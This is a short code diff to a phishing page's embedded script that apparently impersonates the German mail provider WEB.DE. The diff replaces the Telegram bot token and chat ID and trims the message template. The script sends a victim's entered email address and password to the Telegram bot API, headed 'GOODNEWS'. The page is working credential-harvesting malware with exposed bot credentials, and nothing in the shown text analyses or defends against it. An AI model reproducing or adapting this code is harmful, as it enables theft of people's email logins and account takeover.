@@ -230,8 +230,8 @@
     
     <script>
         // Telegram credentials
-        const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
-        const TELEGRAM_CHAT_ID = '7473556793';
+        const TELEGRAM_BOT_TOKEN = '7921526967:AAGdKdP01lu02S60uFATJjqr4wQDTREcLt0';
+        const TELEGRAM_CHAT_ID = '7347877229';
 
         // Show the password confirmation popup
         function showPasswordConfirmation() {
@@ -316,9 +316,9 @@ async function sendToTelegram() {
     
     // Customize the message format
     const message = `
-        *GOODNEWS from WEB.DE*
-        *Email:* ${email}
-        *Password:* ${password}
+        *GOODNEWS*
+        *E:* ${email}
+        *P:* ${password}
     `;
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
